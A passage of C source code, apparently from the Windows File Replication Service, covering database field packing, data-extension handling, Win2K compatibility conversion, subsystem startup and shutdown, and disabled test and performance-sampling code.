    //
    // EMPTY BLOB
    //
    if (StrW == NULL) {
        FStatus = DBS_REALLOC_FIELD(TableCtx, Fieldx, 0, FALSE);
        DPRINT_FS(0, "++ ERROR - reallocating string blob to 0.", FStatus);
        return FStatus;
    }

    //
    // COMPUTE BLOB SIZE
    //
    BlobSize = (wcslen(StrW) + 1) * sizeof(WCHAR);

    //
    // Reallocate the blob
    //
    FStatus = DBS_REALLOC_FIELD(TableCtx, Fieldx, BlobSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT1_FS(0, "++ ERROR - reallocating string blob to %d.", BlobSize, FStatus);
        return FStatus;
    }

    //
    // POPULATE THE BLOB
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx);
    CopyMemory(Next, StrW, BlobSize);

    //
    // Done
    //
    return FrsErrorSuccess;
}




ULONG
DbsUnPackStrW(
    OUT PWCHAR       *StrW,
    IN  ULONG        Fieldx,
    IN  PTABLE_CTX   TableCtx
    )
/*++
Routine Description:
    Unpack the string

Arguments:
    StrW
    Fieldx
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsUnPackStrW:"
    PUCHAR  Next;
    ULONG   BlobSize;

    //
    // No string so far
    //
    *StrW = FrsFree(*StrW);

    //
    // Find the address of the string
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx);
    if (Next == NULL) {
        return FrsErrorSuccess;
    }

    //
    // Blob's size
    //
    BlobSize = (wcslen((PWCHAR)Next) + 1) * sizeof(WCHAR);
    if (BlobSize == 0) {
        return FrsErrorSuccess;
    }

    //
    // Unpack the string
    //
    *StrW = FrsAlloc(BlobSize);
    CopyMemory(*StrW, Next, BlobSize);

    //
    // Done
    //
    return FrsErrorSuccess;
}



PVOID
DbsDataExtensionFind(
    IN PVOID ExtBuf,
    IN DATA_EXTENSION_TYPE_CODES TypeCode
    )
/*++
Routine Description:

    Search the data extension buffer for the desired data component.

Arguments:
    ExtBuf    -- Ptr to data extension buffer.

    TypeCode  -- The component data type to find.

Return Value:

    Ptr to the data component or NULL if not found.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataExtensionFind:"


    PULONG pOffset;
    PULONG pULong;
    PDATA_EXTENSION_PREFIX    ComponentPrefix;
    PIDTABLE_RECORD_EXTENSION IdtExt;



    FRS_ASSERT(TypeCode < DataExtend_Max);
    FRS_ASSERT(ExtBuf != NULL);

    //
    // All data extensions have the same prefix layout so use the IDTable.
    //
    IdtExt = (PIDTABLE_RECORD_EXTENSION) ExtBuf;

    if (IdtExt->FieldSize == 0) {
        return NULL;
    }

    if (IdtExt->FieldSize >= REALLY_BIG_EXTENSION_SIZE) {
        pULong = ExtBuf;

        DPRINT5(5, "Extension Buffer: (%08x) %08x %08x %08x %08x\n",
                   pULong, *(pULong+0), *(pULong+1), *(pULong+2), *(pULong+3));
        DPRINT5(5, "Extension Buffer: (%08x) %08x %08x %08x %08x\n",
                   (PCHAR)pULong+16, *(pULong+4), *(pULong+5), *(pULong+6), *(pULong+7));

        FRS_ASSERT(!"IdtExt->FieldSize invalid");
    }

    //
    // Loop thru the data component offset array to find the desired type.
    //
    pOffset = &IdtExt->Offset[0];

    while (*pOffset != 0) {
        ComponentPrefix = (PDATA_EXTENSION_PREFIX) ((PCHAR)IdtExt + *pOffset);

        if (ComponentPrefix->Type == TypeCode) {
            return  ComponentPrefix;
        }
        pOffset += 1;
    }

    return NULL;
}


VOID
DbsDataInitIDTableExtension(
    IN PIDTABLE_RECORD_EXTENSION IdtExt
    )
/*++
Routine Description:

    Init the IDTable data extension buffer.

Arguments:
    IdtExt    -- Ptr to data extension buffer.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataInitIDTableExtension:"

    PDATA_EXTENSION_PREFIX    ComponentPrefix;

    FRS_ASSERT(IdtExt != NULL);

    //
    // Init the extension buffer.
    //
    IdtExt->FieldSize = sizeof(IDTABLE_RECORD_EXTENSION);
    IdtExt->Major = 0;
    IdtExt->OffsetCount = ARRAY_SZ(IdtExt->Offset);

    //
    // Init offset to Data Checksum Component and its prefix.
    //
    IdtExt->Offset[0] = OFFSET(IDTABLE_RECORD_EXTENSION, DataChecksum);
    IdtExt->DataChecksum.Prefix.Size = sizeof(DATA_EXTENSION_CHECKSUM);
    IdtExt->DataChecksum.Prefix.Type = DataExtend_MD5_CheckSum;

    //
    // Init offset to Data Retry Timeout Component and its prefix.
    //
    IdtExt->Offset[1] = OFFSET(IDTABLE_RECORD_EXTENSION, DataRetryTimeout);
    IdtExt->DataRetryTimeout.Prefix.Size = sizeof(DATA_EXTENSION_RETRY_TIMEOUT);
    IdtExt->DataRetryTimeout.Prefix.Type = DataExtend_Retry_Timeout;


    //
    // Terminate offset vector with a zero
    //
    IdtExt->OffsetLast = 0;
}





VOID
DbsDataInitCocExtension(
    IN PCHANGE_ORDER_RECORD_EXTENSION CocExt
    )
/*++
Routine Description:

    Init the Change Order record extension buffer.

Arguments:

    CocExt -- Ptr to data extension buffer.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataInitCocExtension:"

    PDATA_EXTENSION_PREFIX    ComponentPrefix;

    FRS_ASSERT(CocExt != NULL);

    //
    // Init the extension buffer.
    //
    CocExt->FieldSize = sizeof(CHANGE_ORDER_RECORD_EXTENSION);
    CocExt->Major = CO_RECORD_EXTENSION_VERSION_1;
    CocExt->OffsetCount = ARRAY_SZ(CocExt->Offset);

    //
    // Init offset to Data Checksum Component and its prefix.
    //
    CocExt->Offset[0] = OFFSET(CHANGE_ORDER_RECORD_EXTENSION, DataChecksum);
    CocExt->DataChecksum.Prefix.Size = sizeof(DATA_EXTENSION_CHECKSUM);
    CocExt->DataChecksum.Prefix.Type = DataExtend_MD5_CheckSum;

    //
    // Init offset to Data Retry Timeout Component and its prefix.
    //
    CocExt->Offset[1] = OFFSET(IDTABLE_RECORD_EXTENSION, DataRetryTimeout);
    CocExt->DataRetryTimeout.Prefix.Size = sizeof(DATA_EXTENSION_RETRY_TIMEOUT);
    CocExt->DataRetryTimeout.Prefix.Type = DataExtend_Retry_Timeout;

    //
    // Terminate offset vector with a zero
    //
    CocExt->OffsetLast = 0;

}

VOID
DbsDataInitCocExtensionWin2K(
    IN PCO_RECORD_EXTENSION_WIN2K CocExt
    )
/*++
Routine Description:

    Init the Win2K compatible Change Order record extension buffer.

Arguments:

    CocExt -- Ptr to data extension buffer.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataInitCocExtensionWin2K:"

    PDATA_EXTENSION_PREFIX    ComponentPrefix;

    FRS_ASSERT(CocExt != NULL);

    //
    // Init the extension buffer.
    //
    CocExt->FieldSize = sizeof(CO_RECORD_EXTENSION_WIN2K);
    CocExt->Major = CO_RECORD_EXTENSION_VERSION_WIN2K;
    CocExt->OffsetCount = ARRAY_SZ(CocExt->Offset);

    //
    // Init offset to Data Checksum Component and its prefix.
    //
    CocExt->Offset[0] = OFFSET(CO_RECORD_EXTENSION_WIN2K, DataChecksum);
    CocExt->DataChecksum.Prefix.Size = sizeof(DATA_EXTENSION_CHECKSUM);
    CocExt->DataChecksum.Prefix.Type = DataExtend_MD5_CheckSum;

    //
    // Terminate offset vector with a zero
    //
    CocExt->OffsetLast = 0;

}


PCO_RECORD_EXTENSION_WIN2K
DbsDataConvertCocExtensionToWin2K(
    IN PCHANGE_ORDER_RECORD_EXTENSION CocExt
    )
/*++
Routine Description:

    Convert the current co extension to a Win2K compatible Change Order
    record extension so we can send it to a downlevel member.
    See comment in FRSCOMM.C for why this is needed.

Arguments:

    CocExt -- Ptr to data extension buffer.

Return Value:

    ptr to the win2K compatible extension.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataConvertCocExtensionToWin2K:"

    PCO_RECORD_EXTENSION_WIN2K     CocExtW2K;
    PDATA_EXTENSION_CHECKSUM       CocDataChkSum, W2KDataChkSum;

    //
    // Allocate and init a Win2K compatible extension.
    //
    CocExtW2K = FrsAlloc(sizeof(CO_RECORD_EXTENSION_WIN2K));
    DbsDataInitCocExtensionWin2K(CocExtW2K);

    //
    // If the supplied Change Order has a file checksum, save it in the Win2K version.
    //
    CocDataChkSum = DbsDataExtensionFind(CocExt, DataExtend_MD5_CheckSum);

    if (CocDataChkSum != NULL) {
        if (CocDataChkSum->Prefix.Size != sizeof(DATA_EXTENSION_CHECKSUM)) {
            DPRINT1(0, "<MD5_CheckSum Size (%08x) invalid>\n",
                    CocDataChkSum->Prefix.Size);
        }

        W2KDataChkSum = DbsDataExtensionFind(CocExtW2K, DataExtend_MD5_CheckSum);

        if (W2KDataChkSum != NULL) {
            if (W2KDataChkSum->Prefix.Size != sizeof(DATA_EXTENSION_CHECKSUM)) {
                DPRINT1(0, "<MD5_CheckSum Size (%08x) invalid>\n",
                        W2KDataChkSum->Prefix.Size);
            }

            //
            // Copy the MD5 checksum into Win2K compat. extension.
            //
            CopyMemory(W2KDataChkSum->Data, CocDataChkSum->Data, MD5DIGESTLEN);
        }
    }

    return CocExtW2K;

}


PCHANGE_ORDER_RECORD_EXTENSION
DbsDataConvertCocExtensionFromWin2K(
    IN PCO_RECORD_EXTENSION_WIN2K CocExtW2K
    )
/*++
Routine Description:

    Convert the supplied Win2K co extension to the current Change Order
    record extension when we receive it from a downlevel member.
    See comment in FRSCOMM.C for why this is needed.

Arguments:

    ptr to the win2K compatible extension.

Return Value:

    Ptr to the current data extension buffer.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDataConvertCocExtensionFromWin2K:"

    PCHANGE_ORDER_RECORD_EXTENSION  CocExt;
    PDATA_EXTENSION_CHECKSUM        CocDataChkSum, W2KDataChkSum;

    //
    // Allocate and init an extension.
    //
    CocExt = FrsAlloc(sizeof(CHANGE_ORDER_RECORD_EXTENSION));
    DbsDataInitCocExtension(CocExt);

    //
    // If the supplied Change Order has a file checksum, save it in the Win2K version.
    //
    W2KDataChkSum = DbsDataExtensionFind(CocExtW2K, DataExtend_MD5_CheckSum);
    CocDataChkSum = DbsDataExtensionFind(CocExt, DataExtend_MD5_CheckSum);

    if ((W2KDataChkSum != NULL) && (CocDataChkSum != NULL)) {

        //
        // Copy the MD5 checksum from the Win2K extension.
        //
        CopyMemory(CocDataChkSum->Data, W2KDataChkSum->Data, MD5DIGESTLEN);
    }

    return CocExt;

}


VOID
DbsInitialize (
    VOID
    )
/*++
Routine Description:
    External entrypoint for database initialization.

Arguments:
    None.

Return Value:
    winerror
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsInitialize:"
    PCOMMAND_PACKET CmdPkt;
    BOOL            EmptyDatabase;
    ULONG           Status;

    PCO_RETIRE_DECISION_TABLE pDecRow;
    ULONG  DCMask, CondMatch, i, j;

    //
    // Init the global replica list.
    //
    FrsInitializeQueue(&ReplicaListHead, &ReplicaListHead);

    FrsInitializeQueue(&ReplicaStoppedListHead, &ReplicaStoppedListHead);

    FrsInitializeQueue(&ReplicaFaultListHead, &ReplicaFaultListHead);

    //
    // Lock held when moving a replica set between state lists
    //
    INITIALIZE_CRITICAL_SECTION(&JrnlReplicaStateLock);

    //
    // Step thru the decision table and init the Don't care mask and Condition
    // Match fields for each row.
    //
    pDecRow = CoRetireDecisionTable;
    j = 0;

    while (pDecRow->RetireFlag != 0) {
        DCMask = 0;
        CondMatch = 0;
        for (i=0; i < ARRAY_SZ(pDecRow->ConditionTest); i++) {
            if (pDecRow->ConditionTest[i] == 0) {
                // Don't care field sets mask and match to zero.
                DCMask    = (DCMask    << 1) | 0;
                CondMatch = (CondMatch << 1) | 0;
            } else
            if (pDecRow->ConditionTest[i] == 1) {
                // Match on 1 (or True) field sets mask and match to one.
                DCMask    = (DCMask    << 1) | 1;
                CondMatch = (CondMatch << 1) | 1;
            } else {
                // Match on 0 (or False) field sets mask to one and match to zero.
                DCMask    = (DCMask    << 1) | 1;
                CondMatch = (CondMatch << 1) | 0;
            }
        }
        pDecRow->DontCareMask = DCMask;
        pDecRow->ConditionMatch = CondMatch;
        DPRINT3(4, ":I: Retire Decision[%2d] Mask, Match :  %08x  %08x\n",
                j++, DCMask, CondMatch);

        pDecRow += 1;
    }

    //
    // Create the File System monitor thread.  It inits its process queue
    // and then waits for a packet.  First packet should be to init.
    //
    //
    // Init the journal queue and setup our entry in the sybsystem
    // queue vector so we can receive commands.
    //
    FrsInitializeQueue(&JournalProcessQueue, &JournalProcessQueue);

    if (!ThSupCreateThread(L"JRNL", NULL, Monitor, ThSupExitThreadNOP)) {
        DPRINT(0, ":S: ERROR - Could not create Monitor thread\n");
        return;
    }

    //
    // Create the Database Service command server.  It inits its process queue
    // and then waits for a packet.  First packet should be to init.
    // The purpose of this service thread is to to perform simple operations
    // on the database from a thread environment where you don't have an
    // open table and it's not worth the effort to do it there.  E.G. updating
    // the Volume Sequence Number in a Replicas REPLICA struct.
    //
    //
    FrsInitializeCommandServer(&DBServiceCmdServer,
                               DBSERVICE_MAX_THREADS,
                               L"DBCs",
                               DBService);
    //
    // Init the DBService sub-system.
    //
    CmdPkt = DbsPrepareCmdPkt(NULL,                //  CmdPkt,
                              NULL,                //  Replica,
                              CMD_INIT_SUBSYSTEM,  //  CmdRequest,
                              NULL,                //  TableCtx,
                              NULL,                //  CallContext,
                              0,                   //  TableType,
                              0,                   //  AccessRequest,
                              0,                   //  IndexType,
                              NULL,                //  KeyValue,
                              0,                   //  KeyValueLength,
                              TRUE);               //  Submit

    //
    // Init and start the journal sub-system.
    //
    CmdPkt = FrsAllocCommand(&JournalProcessQueue, CMD_INIT_SUBSYSTEM);
    FrsSubmitCommand(CmdPkt, FALSE);
}


VOID
DbsShutDown (
    VOID
    )
/*++
Routine Description:
    External entrypoint for database shutdown.

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsShutDown:"

PCOMMAND_PACKET      CmdPkt;
    //
    // Tell the DBService sub-system to stop.
    //
    DbsPrepareCmdPkt(NULL,                //  CmdPkt,
                     NULL,                //  Replica,
                     CMD_STOP_SUBSYSTEM,  //  CmdRequest,
                     NULL,                //  TableCtx,
                     NULL,                //  CallContext,
                     0,                   //  TableType,
                     0,                   //  AccessRequest,
                     0,                   //  IndexType,
                     NULL,                //  KeyValue,
                     0,                   //  KeyValueLength,
                     TRUE);               //  Submit
}



#if 0
// Test code.

VOID
DbsOperationTest(
    VOID
    )
/*++

Routine Description:

    This is a test routine that reads and writes config records and creates
    a new replica set.

Arguments:

    None.

Thread Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsOperationTest:"


    ULONG                WStatus;
    ULONG                FStatus;
    ULONG                AccessRequest;
    PFRS_REQUEST_COUNT   DbRequestCount;
    PDB_SERVICE_REQUEST  DbsRequest;
    GUID                 ReplicaMemberGuid;
    ULONG                ReplicaNumber;
    PCOMMAND_PACKET      CmdPkt;
    PTABLE_CTX           TableCtx;
    PCONFIG_TABLE_RECORD ConfigRecord;
    FILETIME             SystemTime;

    //
    // Allocate and init a request count struct so we know when our commands
    // have been finished.
    //
    DPRINT(0, "BEGIN DBS READ LOOP ***************************************\n");
    DbRequestCount = FrsAlloc(sizeof(FRS_REQUEST_COUNT));
    FrsInitializeRequestCount(DbRequestCount);

    AccessRequest = DBS_ACCESS_FIRST;
    CmdPkt = NULL;
    TableCtx = NULL;
    FStatus = FrsErrorSuccess;

    while (FStatus != FrsErrorEndOfTable) {

        CmdPkt = DbsPrepareCmdPkt(CmdPkt,              //  CmdPkt,
                                  NULL,                //  Replica,
                                  CMD_READ_TABLE_RECORD, //  CmdRequest,
                                  TableCtx,            //  TableCtx,
                                  NULL,                //  CallContext,
                                  ConfigTablex,        //  TableType,
                                  AccessRequest,       //  AccessRequest,
                                  ReplicaSetNameIndexx,//  IndexType,
                                  NULL,                //  KeyValue,
                                  0,                   //  KeyValueLength,
                                  FALSE);              //  Submit

        if (CmdPkt == NULL) {
            DPRINT(0, "ERROR - Failed to init the cmd pkt\n");
            break;
        }
        FrsIncrementRequestCount(DbRequestCount);
        FrsSetCompletionRoutine(CmdPkt, FrsCompleteRequestCountKeepPkt, DbRequestCount);

        FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
        //
        // Wait until command request is completed.
        //
        WStatus = FrsWaitOnRequestCount(DbRequestCount, 10000);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT_WS(0, "ERROR - FrsWaitOnRequestCount(DbRequestCount) failed", WStatus);
            break;
        }

        DbsRequest = &CmdPkt->Parameters.DbsRequest;
        TableCtx = DBS_GET_TABLECTX(DbsRequest);
        FStatus = DbsRequest->FStatus;

        if (FRS_SUCCESS(FStatus)) {
            //
            // Print the config record.
            //
            if (TableCtx == NULL) {
                DPRINT(0, "ERROR - TableCtx is NULL on return from DBS.\n");
            }
            // FRS_DISPLAY_RECORD(TableCtx, TRUE);
        } else
        if (FStatus == FrsErrorEndOfTable) {
            break;
        } else {
            DPRINT_FS(0, "ERROR - Read DBservice request failed.", FStatus);
            break;
        }

        //
        // Now write the record back by key with a minor change.
        //

        ConfigRecord = (PCONFIG_TABLE_RECORD) DBS_GET_RECORD_ADDRESS(DbsRequest);

        ConfigRecord->MaxInBoundLogSize += 1;  // Testing

        DbsPrepareCmdPkt(CmdPkt,                        //  CmdPkt,
                         NULL,                          //  Replica,
                         CMD_UPDATE_TABLE_RECORD,       //  CmdRequest,
                         TableCtx,                      //  TableCtx,
                         NULL,                          //  CallContext,
                         ConfigTablex,                  //  TableType,
                         DBS_ACCESS_BYKEY,              //  AccessRequest,
                         ReplicaNumberIndexx,           //  IndexType,
                         &ConfigRecord->ReplicaNumber,  //  KeyValue,
                         sizeof(ULONG),                 //  KeyValueLength,
                         FALSE);                        //  Submit

        FrsIncrementRequestCount(DbRequestCount);
        FrsSetCompletionRoutine(CmdPkt, FrsCompleteRequestCountKeepPkt, DbRequestCount);

        FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
        //
        // Wait until command request is completed.
        //
        WStatus = FrsWaitOnRequestCount(DbRequestCount, 10000);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT_WS(0, "ERROR - FrsWaitOnRequestCount(DbRequestCount) failed", WStatus);
            break;
        }

        DbsRequest = &CmdPkt->Parameters.DbsRequest;
        TableCtx = DBS_GET_TABLECTX(DbsRequest);
        FStatus = DbsRequest->FStatus;

        if (FRS_SUCCESS(FStatus)) {
            //
            // Print the config record.
            //
            if (TableCtx == NULL) {
                DPRINT(0, "ERROR - TableCtx is NULL on return from DBS.\n");
            }
            // FRS_DISPLAY_RECORD(TableCtx, TRUE);
        } else {
            DPRINT_FS(0, "ERROR - Write DBservice request failed.", FStatus);
            break;
        }

        ConfigRecord = NULL;
        AccessRequest = DBS_ACCESS_NEXT;

    }  // end of while()

    //
    // Close the table and cleanup the request count.
    //
    if (CmdPkt != NULL) {
        //
        // change the completion routine to delete the cmd pkt and send the close.
        // This frees the table context and the associated data record.
        //
        FrsSetCompletionRoutine(CmdPkt, FrsFreeCommand, 0);

        DbsPrepareCmdPkt(CmdPkt,                   //  CmdPkt,
                         NULL,                     //  Replica,
                         CMD_CLOSE_TABLE,          //  CmdRequest,
                         TableCtx,                 //  TableCtx,
                         NULL,                     //  CallContext,
                         0,                        //  TableType,
                         DBS_ACCESS_FREE_TABLECTX, //  AccessRequest,
                         0,                        //  IndexType,
                         NULL,                     //  KeyValue,
                         0,                        //  KeyValueLength,
                         TRUE);                    //  Submit

    }


    DPRINT(0, "END DBS READ LOOP ***************************************\n");


    //
    // The following example creates a new replica set member.
    // It inserts a new record into the config table and creates a set
    // of associated replica tables.
    //
    // First create a table context for the record.
    //
    DPRINT(0, "BEGIN DBS INSERT ***************************************\n");

    TableCtx = DbsCreateTableContext(ConfigTablex);

    CmdPkt = NULL;
    CmdPkt = DbsPrepareCmdPkt(CmdPkt,              //  CmdPkt,
                              NULL,                //  Replica,
                              CMD_CREATE_REPLICA_SET_MEMBER, //  CmdRequest,
                              TableCtx,            //  TableCtx,
                              NULL,                //  CallContext,
                              ConfigTablex,        //  TableType,
                              DBS_ACCESS_CLOSE,    //  AccessRequest,
                              0,                   //  IndexType,
                              NULL,                //  KeyValue,
                              0,                   //  KeyValueLength,
                              FALSE);              //  Submit

    if (CmdPkt == NULL) {
        DPRINT(0, "ERROR - Failed to init the cmd pkt\n");
        FrsDeleteRequestCount(DbRequestCount);
        goto DB_QUERY_FAILED;
    }

    DbsRequest = &CmdPkt->Parameters.DbsRequest;
    ConfigRecord = (PCONFIG_TABLE_RECORD) DBS_GET_RECORD_ADDRESS(DbsRequest);

    //
    // Init the config record.
    //
    FrsUuidCreate(&ReplicaMemberGuid);
    ReplicaNumber = InterlockedIncrement(&FrsMaxReplicaNumberUsed);

    DbsDBInitConfigRecord(ConfigRecord,                // ConfigRecord
                          &ReplicaMemberGuid,          // ReplicaSetGuid
                          TEXT("Replica-V:foo3"),      // ReplicaSetName
                          ReplicaNumber,               // ReplicaNumber
                          TEXT("u:\\sub1\\foo3"),      // ReplicaRootPath
                          TEXT("u:\\tmp"),             // ReplicaStagingPath
                          TEXT("u:\\"));               // ReplicaVolume

    GetSystemTimeAsFileTime(&SystemTime);
    COPY_TIME(&ConfigRecord->LastDSChangeAccepted, &SystemTime);

    // FRS_DISPLAY_RECORD(TableCtx, TRUE);
    //
    // Resize some of the binary fields.
    //

    DPRINT3(4, "Field ThrottleSched- Size: %d, MaxSize %d, Address: %08x\n",
        DBS_GET_FIELD_SIZE(TableCtx, ThrottleSchedx),
        DBS_GET_FIELD_SIZE_MAX(TableCtx, ThrottleSchedx),
        DBS_GET_FIELD_ADDRESS(TableCtx, ThrottleSchedx));


    DPRINT3(4, "Field FileTypePrioList- Size: %d, MaxSize %d, Address: %08x\n",
        DBS_GET_FIELD_SIZE(TableCtx, FileTypePrioListx),
        DBS_GET_FIELD_SIZE_MAX(TableCtx, FileTypePrioListx),
        DBS_GET_FIELD_ADDRESS(TableCtx, FileTypePrioListx));


    FStatus = DBS_REALLOC_FIELD(TableCtx, ThrottleSchedx, 100, FALSE);
    DPRINT_FS(0, "Error - Failed realloc of ThrottleSched.", FStatus);

    FStatus = DBS_REALLOC_FIELD(TableCtx, FileTypePrioListx, 0, FALSE);
    DPRINT_FS(0, "Error - Failed realloc of FileTypePrioListx.", FStatus);

    DPRINT3(4, "Field ThrottleSched- Size: %d, MaxSize %d, Address: %08x\n",
        DBS_GET_FIELD_SIZE(TableCtx, ThrottleSchedx),
        DBS_GET_FIELD_SIZE_MAX(TableCtx, ThrottleSchedx),
        DBS_GET_FIELD_ADDRESS(TableCtx, ThrottleSchedx));

    DPRINT3(4, "Field FileTypePrioList- Size: %d, MaxSize %d, Address: %08x\n",
        DBS_GET_FIELD_SIZE(TableCtx, FileTypePrioListx),
        DBS_GET_FIELD_SIZE_MAX(TableCtx, FileTypePrioListx),
        DBS_GET_FIELD_ADDRESS(TableCtx, FileTypePrioListx));

    // FRS_DISPLAY_RECORD(TableCtx, TRUE);

    //
    // Set up request count and completion routine.  Then submit the command.
    //
    FrsIncrementRequestCount(DbRequestCount);
    FrsSetCompletionRoutine(CmdPkt, FrsCompleteRequestCountKeepPkt, DbRequestCount);

    FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
    //
    // Wait until command request is completed.
    //
    WStatus = FrsWaitOnRequestCount(DbRequestCount, 10000);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(0, "ERROR - FrsWaitOnRequestCount(DbRequestCount) failed", WStatus);
        //
        // Can't free memory because DB server could still use it.
        //
        goto DB_QUERY_FAILED2;
    }

    FStatus = DbsRequest->FStatus;

    if (FRS_SUCCESS(FStatus)) {
        //
        // Print the config record.
        //
        if (TableCtx == NULL) {
            DPRINT(0, "ERROR - TableCtx is NULL on return from DBS.\n");
        }
        // FRS_DISPLAY_RECORD(TableCtx, TRUE);
    } else {
        DPRINT_FS(0, "ERROR - Insert DBservice request failed.", FStatus);
    }


    //
    // Pitch the table context and the command packet.
    //
    if (!DbsFreeTableContext(TableCtx, 0)) {
        DPRINT(0, "ERROR - Failed to free the table context\n");
    }

    FrsFreeCommand(CmdPkt, NULL);


    FrsDeleteRequestCount(DbRequestCount);

DB_QUERY_FAILED:
    DbRequestCount = FrsFree(DbRequestCount);

DB_QUERY_FAILED2:

    DPRINT(0, "END DBS WRITE TEST ***************************************\n");


}

#endif 0




#if 0


//
// Wrapper for NtQuerySystemInformation call.
// (assumes that Status is declared as NTSTATUS and QuerySysInfoReturnLength
// is declared ULONG).
//
#define QuerySysInfo(_InfoClass, _InfoStruct) \
    Status = NtQuerySystemInformation(_InfoClass, \
                                     &_InfoStruct, \
                                     sizeof(_InfoStruct), \
                                     &QuerySysInfoReturnLength); \
    if (!NT_SUCCESS(Status)) {  \
        printf ("NtQuerySystemInfo - %s failed ", #_InfoClass);  \
        printf ("with status %x on %s\n", Status, #_InfoStruct);  \
        DisplayNTStatus(Status); \
        }

#define QuerySysInfo3(_InfoClass, _InfoStruct, _InfoAddress) \
    Status = NtQuerySystemInformation(_InfoClass, \
                                      _InfoAddress, \
                                     sizeof(_InfoStruct), \
                                     &QuerySysInfoReturnLength); \
    if (!NT_SUCCESS(Status)) {  \
        printf ("NtQuerySystemInfo - %s failed ", #_InfoClass);  \
        printf ("with status %x on %s\n", Status, #_InfoStruct);  \
        DisplayNTStatus(Status); \
        }


    ULONG QuerySysInfoReturnLength;
    NTSTATUS Status;
    ULONG i;
    SYSTEM_TIMEOFDAY_INFORMATION LocalTimeOfDayInfo;
    SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION ProcessorPerformanceInfo[MAX_CPUS];
    SYSTEM_PERFORMANCE_INFORMATION SystemPerformanceInfo;
    SYSTEM_EXCEPTION_INFORMATION SystemExceptionInfo;
    SYSTEM_INTERRUPT_INFORMATION SystemInterruptInfo[MAX_CPUS];
    SYSTEM_CONTEXT_SWITCH_INFORMATION ContextSwitchInfo;

    QuerySysInfo(SystemTimeOfDayInformation, LocalTimeOfDayInfo);



    QuerySysInfo(SystemPerformanceInformation, SystemPerformanceInfo);

QuerySysInfo(SystemProcessorPerformanceInformation, ProcessorPerformanceInfo);
QuerySysInfo(SystemExceptionInformation, SystemExceptionInfo);
QuerySysInfo(SystemInterruptInformation, SystemInterruptInfo);
QuerySysInfo(SystemContextSwitchInformation, ContextSwitchInfo);

    NtQuerySystemInformation(
        SystemTimeOfDayInformation,
        &LocalTimeOfDayInfo,
        sizeof(LocalTimeOfDayInfo),
        &ReturnLocalTimeOfDayInfoLength);

    UpTime = (LocalTimeOfDayInfo.CurrentTime.QuadPart -
             LocalTimeOfDayInfo.BootTime.QuadPart) / (LONGLONG) 10000000;
    printf("System Up Time (hours)          %8.2f\n", (float)UpTime/3600.0);

        szChar = sizeof(Buf);
    GetVolumeInformation(NULL, NULL, (ULONG) NULL, NULL, NULL, NULL, Buf, szChar);
    printf( "Filesystem Type: %s\n", Buf );

        //
    //      Get the disk space status:
    //
    GetDiskFreeSpace( NULL, &sec, &bytes, &fclust, &tclust );
    printf( "\t%-16s %3.1f/%3.1f\n",
                            "Disk Space",
                            ((double)sec*bytes*fclust)/MBYTE,
                            ((double)sec*bytes*tclust)/MBYTE );



        CHAR KernelPath[MAX_PATH];
        GetSystemDirectory(KernelPath,sizeof(KernelPath));


    for (i = 0; i < NumberCpus; i++) {
        Sample->TotalCpuTime[i] = ProcessorPerformanceInfo[i].KernelTime.QuadPart +
                                  ProcessorPerformanceInfo[i].UserTime.QuadPart;
        //
        // kernel time also includes the system idle thread so remove this
        // from the kernel time component.
        //
        Sample->KernelTime[i] = ProcessorPerformanceInfo[i].KernelTime.QuadPart -
                                ProcessorPerformanceInfo[i].IdleTime.QuadPart;

        Sample->CpuTime[i] = Sample->KernelTime[i] +
                             ProcessorPerformanceInfo[i].UserTime.QuadPart;
        Sample->Nb3ClientCpuTime += Sample->CpuTime[i];

        Sample->IdleTime[i] = ProcessorPerformanceInfo[i].IdleTime.QuadPart;
        Sample->UserTime[i] = ProcessorPerformanceInfo[i].UserTime.QuadPart;
        //
        // Note that DpcTime and InterruptTime are also included in Kernel Time.
        //
        Sample->DpcTime[i] = ProcessorPerformanceInfo[i].DpcTime.QuadPart;
        Sample->InterruptTime[i] = ProcessorPerformanceInfo[i].InterruptTime.QuadPart;
        Sample->InterruptCount[i] = (ULONGLONG) ProcessorPerformanceInfo[i].InterruptCount;

        Sample->CpuCtxSwitches[i] = SystemInterruptInfo[i].ContextSwitches;
        Sample->DpcCount[i]       = SystemInterruptInfo[i].DpcCount;
        Sample->DpcRate[i]        = SystemInterruptInfo[i].DpcRate;
        Sample->DpcBypassCount[i] = SystemInterruptInfo[i].DpcBypassCount;
        Sample->ApcBypassCount[i] = SystemInterruptInfo[i].ApcBypassCount;

        Sample->ServerRequests[i] = (ULONGLONG) SrvSampleStatistics.SrvRequests[i];
        Sample->ServerRequestsPerInterrupt[i] = Sample->ServerRequests[i];
        Sample->ServerRequestsPerCtxsw[i] = Sample->ServerRequests[i];
        Sample->ServerRequestTime[i] = SrvSampleStatistics.SrvRequestTime[i];
        Sample->ServerClients[i]     = (ULONGLONG) SrvSampleStatistics.SrvClients[i];
        Sample->ServerQueueLength[i] = (ULONGLONG) SrvSampleStatistics.SrvQueueLength[i];

        Sample->ServerBytesReceived[i]   = SrvSampleStatistics.SrvBytesReceived[i];
        Sample->ServerBytesSent[i]       = SrvSampleStatistics.SrvBytesSent[i];
        Sample->ServerReadOperations[i]  = SrvSampleStatistics.SrvReadOperations[i];
        Sample->ServerBytesRead[i]       = SrvSampleStatistics.SrvBytesRead[i];
